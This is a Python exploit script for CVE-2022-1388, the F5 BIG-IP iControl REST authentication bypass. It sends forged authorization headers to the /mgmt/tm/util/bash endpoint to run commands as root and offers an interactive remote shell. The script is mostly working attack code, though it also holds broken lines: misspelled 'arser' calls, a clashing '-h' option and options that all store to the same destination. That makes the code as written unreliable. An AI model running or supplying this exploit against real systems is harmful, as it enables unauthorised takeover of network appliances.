import requests
import optparse
import readline
import urllib3
urllib3.disable_warnings()
from urllib.error import HTTPError

parser = optparse.OptionParser()
parser.add_option('-u', '--url', action="store", dest="url", help="The IP address of the target.")
parser.add_option('-t', '--test', action="store_true", dest="test", help="Test target for CVE-2022-1388.", default=False)
parser.add_option('-s', '--shell', action="store_true", dest="shell", help="run an interactive shell.", default=False)
arser.add_option('-h', '--host', action="store", dest="url", help="Host IP address")
arser.add_option('-a', '--auth', action="store", dest="url", help="X-F5-Authorization token")
options, args = parser.parse_args()
session = requests.Session()

url_vuln = options.url
host_vuln = options.host
auth_vuln = options.auth
cmd_1 = []
ps1 = []

if not options.url:    
    print('[+] Please specify a target.')
    exit()

def test_expl():
    global HTTPError
    command = "whoami"    
    print("Running test on target: "+url_vuln+" | Command: whoami" )    
    url = f'{url_vuln}/mgmt/tm/util/bash'
    headers = {
        'Host': url_vuln,
        'Authorization': 'Basic YWRtaW46aG9yaXpvbjM=',
        'X-F5-Auth-Token': options.auth,        
        'Connection': 'X-F5-Auth-Token',
        'Content-Type': 'application/json'           
    }
    j = {"command":"run","utilCmdArgs":"-c '{0}'".format(command)}
    r = requests.post(url, headers=headers, json=j, verify=False)
    if ( r.status_code == 401):
         print('')
         print('Target Returned 401 Client Error: F5 Authorization Required')
         print('Target is not vulnerable...')
         exit()
    r.raise_for_status()    
    if ( r.status_code != 204 and r.headers["content-type"].strip().startswith("application/json")):
        print("Response: "+r.json()['commandResult'].strip())        
        if not options.shell:
            print("Target is vulnerable!!")
            print("")
            print("Use -s option to run an interactive shell")
        else:
             print("Target is vulnerable!! Running interactive shell..")
             print("") 
    else:
        print("Response is empty! Target is not vulnerable..")
        exit()    

def getPS1():
    command = "echo `whoami`@`cat /proc/sys/kernel/hostname`: $PWD"
    url = f'{url_vuln}/mgmt/tm/util/bash'
    headers = {
        'Host': '127.0.0.1',
        'Authorization': 'Basic YWRtaW46aG9yaXpvbjM=',
        'X-F5-Auth-Token': 'asdf',        
        'Connection': 'X-F5-Auth-Token',
        'Content-Type': 'application/json'           
    }
    j = {"command":"run","utilCmdArgs":"-c '{0}'".format(command)}
    r = requests.post(url, headers=headers, json=j, verify=False)
    if ( r.status_code == 401):
         print('')
         print('Target Returned 401 Client Error: F5 Authorization Required')
         print('Target is not vulnerable...')
         exit()
    r.raise_for_status()
    global ps1
    ps1 = r.json()['commandResult'].strip()
    
def cmdExec():
    url = f'{url_vuln}/mgmt/tm/util/bash'
    while True:
        cmd = input(ps1 +'$ ')           
        headers = {
        'Host': '127.0.0.1',
        'Authorization': 'Basic YWRtaW46aG9yaXpvbjM=',
        'X-F5-Auth-Token': 'asdf',        
        'Connection': 'X-F5-Auth-Token',
        'Content-Type': 'application/json'
        }
        j = {"command":"run","utilCmdArgs":"-c '{0}'".format(cmd)}
        r = requests.post(url, headers=headers, json=j, verify=False)
        r.raise_for_status()
        if ( r.status_code != 204 and r.headers["content-type"].strip().startswith("application/json")):
         if 'commandResult' not in r.json():
             ''           
         else:
             print("")
             print(r.json()['commandResult'].strip())
             print("")

if not options.test:
    if not options.shell:
        test_expl()
if options.test:
    test_expl()
if options.shell:
        if not options.test:
             print("Running interactive shell..")
             print("")
        getPS1()
        cmdExec()
